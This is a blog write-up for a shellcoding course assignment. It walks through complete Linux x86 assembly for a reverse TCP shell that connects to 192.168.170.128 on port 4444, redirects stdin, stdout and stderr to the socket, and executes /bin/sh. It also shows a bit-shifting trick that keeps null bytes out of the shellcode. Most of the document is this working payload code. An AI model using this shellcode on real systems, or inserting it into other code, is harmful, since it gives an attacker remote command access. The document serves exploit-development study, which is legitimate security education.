### Assignment Two:

1. Create a Shell_Reverse_TCP shellcode
    - Reverse connects to conﬁgured IP and Port
    - Execs Shell on successful connection
2. IP and Port number should be easily configurable

In our [bind shell poc](https://xmilkpowderx.github.io/2019-06-09-SLAEEX1/), we learn that to execute a bind shell, we need 6 system call in total.

```c
socket() > bind() > listen() > accept() > dup2() > execve()
```

However, for a reverse shell, things are much simpler. All we need is to create a socket and connect it to a remote host, then redirect all file descriptor so that we can transfer our input /bin/sh. To do this, we need 

```c
socket() > connect() > dup2() > execve()
```

It's this quite similar to our bind shell, the syntax for connect() is basically bind(), while the rest of them is the same. As such, we can just modify our bind shell poc.
```asm
global _start

section .text

_start:
;First, we will need to create a socket		
;
;  socketcall(int call, socket(int domain, int type, int protocol)
;  eax:		ebx:    			ecx:
;  0x66		call = 0x1 (SYS_SOCKET)		*args = {domain = 0x2 (AF_INET), type = 0x1 (SOCK_STREAM), protocol = 0x0 (Single Protocol)}
;	
	xor ebx,ebx	; init register
	mul ebx		; this actually seems to set both eax and edx to 0
	push ebx	; 0x0 for protocol
	inc ebx		
	push ebx	; 0x1 for SOCK_STREAM
	push byte +0x2	; 0x2 for AF_INET
	mov ecx,esp	; ecx points to addr of current stack
	mov al,0x66	; 0x66 systemcall for socketcall
	int 0x80

	mov esi, eax	; We need to backup our eax because unlike our bind shell, we cannot get it from eax after connect

;Then we will need to set up connect() to connect to remote host
;
;  socketcall(int call, connect(int sockfd, const struct sockaddr *addr,socklen_t addrlen))
;  eax:		ebx:				ecx:
;  0x66		call = 0x3 (SYS_CONNECT)	*args = {sockfd = socketid = eax, sockaddr = [0x2 (AF_INET), port = 115C (4444), address = 192.168.170.128], addrlen = 0x10}
;
	xor ebx,ebx
	mov bl, 0x3	; 0x3 for SYS_CONNECT
	push dword 0x80AAA8C0	; Our ip address 192.168.170.128
	push word 0x5c11; 115c is 4444 in hexadecimal form
	push word 0x02
	mov ecx,esp	; Store the address of sockaddr to ecx
	push byte 0x10
	push ecx	; push the address that store value of sockaddr to stack
	push esi	; eax was set to the value of socketid after the socket call 
	mov ecx,esp	; ecx points to addr of current stack
	push byte 0x66  ; 0x66 systemcall for socketcall
	pop eax
	int 0x80

;Now, its time for us to redirect all file descriptor we need so that our input and output to the shell 
;will be handled by stdin(0), stdout(1) and stderr(2)
;
;  dup2(int oldfd, int newfd, int flags)
;  eax:		ebx:			ecx:
;  0x3f		oldfd = socketid	newfd = stdin(0), stdout(1) and stderr(2)
;
	xchg esi,ebx
	xor ecx,ecx
	mov cl, 0x2
loop:				; Since we got three fd, we will use loop 3 times
	mov al, 0x3f		; 0x3f systemcall for dup2
	int 0x80
	dec ecx			; 2 > 1 > 0
	jns loop

;At last, the final part, this one is rather easy as we only need to call /bin/sh with execve()
;
;  execve(const char *filename, char *const argv[],char *const envp[])
;  eax:		ebx:			ecx:			edx:
;  0xb		*filename = /bin//sh	address of /bin//sh	0x0
;
	push edx		; seems that edx will be 0x0 at this point, we can use it as a line break
	push dword 0x68732f2f
	push dword 0x6e69622f	; /bin//sh
	mov ebx,esp
	push eax		; eax was set to 0x0 after dup2 and we can use it directly
	push ebx		
	mov ecx,esp
	mov al,0xb		; 0xb systemcall for execve
	int 0x80
``` 
It seems that unlike our bind shell, the stack is not properly aligned, which we cannot just push our /bin//sh into the stack. Luckily, edx is 0x0 and we can just use it to terminate our string.

This poc is working very well, however, what if our ip address contains 0? We don't want our shellcode contains bad characters, right? As such, we will need to modify some of our logic inside connect()

There are quite a few way to achieve our goal and while I am researching, I come up to this solution that use SHL (Shift Left) to do so. It may not be that best way to do it yet learning a few more technique doesn't harm and I will be sticking to this way.

In order to use SHL to control the value, we will modify our code of pushing the address to stack to something like this.
```asm
	; We will be using edx, it is 0x0 at this point
	mov dl,0x80
	SHL EDX,0x8	;move edx to left by one byte
	mov dl,0xAA
	SHL EDX,0x8	;move edx to left by one byte
	mov dl,0xA8
	SHL EDX,0x8	;move edx to left by one byte
	mov dl,0xC0
	push edx
```
What SHL/SHR can do is that it will shift the value inside our register left or right in bit level, the remaining part will become 0. As such, we can shift value by 8 bits one at a time and eventually, pushing the first byte we move to the upper bit of the register. Below is the debug information from gdb.

<img class="image image--xl" src="https://raw.githubusercontent.com/xMilkPowderx/xMilkPowderx.github.io/master/assets/images/SLAE/Ex2-2.JPG"/>

We can see that 0x80 is first being moved to dl. After we shift it to left by one byte, it become 0x8000. Imagine we got a 00 in address at this point, we can just shift to left again and the value will become 0x800000. Then we will continue moving value to dl. At last, we just need to push edx to the stack.
